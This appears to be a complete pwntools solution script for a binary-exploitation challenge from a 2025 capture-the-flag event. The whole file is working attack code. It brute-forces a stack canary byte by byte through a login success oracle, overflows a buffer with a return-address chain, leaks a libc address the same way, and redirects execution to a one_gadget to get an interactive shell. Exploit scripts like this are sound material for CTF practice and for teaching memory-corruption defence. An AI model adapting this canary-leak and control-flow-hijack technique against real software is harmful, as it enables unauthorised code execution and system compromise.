#!/usr/bin/env python3
from pwn import *
import websocket

url = "wss://holactf2025.ehc-fptu.club/api/proxy/0198f915-c300-7d80-9f11-edcabdeee038"
exe = ELF('chall', checksec=False)
libc = ELF('libc.so.6', checksec=False)
p = process(exe.path)
# p = remote("172.19.64.1", 64397)

def login(data):
    p.sendlineafter(b'choice: ', b'1')
    p.sendlineafter(b'password:', data)


input()
password = b'\xff'
for i in range(7):
    for j in range(1, 256):
        test = password + p8(j)
        login(test + b'\0')
        p.recvuntil(b'Login ')
        output = p.recvuntil(b'!')

        if b'successfully' in output:
            print(f"Byte {i + 1}:" + str(j))
            password += p8(j)
            break

canary_bytes = b""
for byte in password:
    if byte == 0xff:  # dừng khi gặp 0xff
        canary_bytes = b'\x00' + canary_bytes
    else:
        canary_bytes = bytes([byte]) + canary_bytes

canary = int(canary_bytes.hex(), 16)
print("canary (int) :", hex(canary))

pop_rdi = 0x000000000002a3e5 
p.sendlineafter(b'choice: ', b'1')
p.sendlineafter(b'password:', b'\00')
p.sendlineafter(b'choice: ', b'2')
payload = b'a'*0x30
payload += p64(canary)
payload += p64(0x404060) #rbp
payload += p64(0x4014ec) #gets
payload += p64(0x401525) #memcpy
payload += p64(0x4013E4) #while
payload = payload.ljust(0x158, b'\0')
p.sendlineafter(b'input:', b'a\00aaaaaa' + payload)
p.sendlineafter(b'choice: ', b'3')
p.sendline(b'aaaaaaaaaaa') 


leak = b''
for i in range(6):
    for j in range(1, 256):
        test = leak + p8(j)
        login(test + b'\0')
        p.recvuntil(b'Login ')
        output = p.recvuntil(b'!')

        if b'successfully' in output:
            print(f"Byte {i + 1}:" + str(j))
            leak += p8(j)
            break
libc_leak_byte = b""
for byte in leak:
    libc_leak_byte = bytes([byte]) + libc_leak_byte

one_gadget = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]
libc_leak = int(libc_leak_byte.hex(), 16)
libc.address = libc_leak - 0x19d7e0
print("libc leak :", hex(libc_leak))
print("libc base :", hex(libc.address))
p.sendlineafter(b'choice: ', b'2')
payload = p64(libc.address + one_gadget[3])
p.sendlineafter(b'input:', payload)

p.interactive()
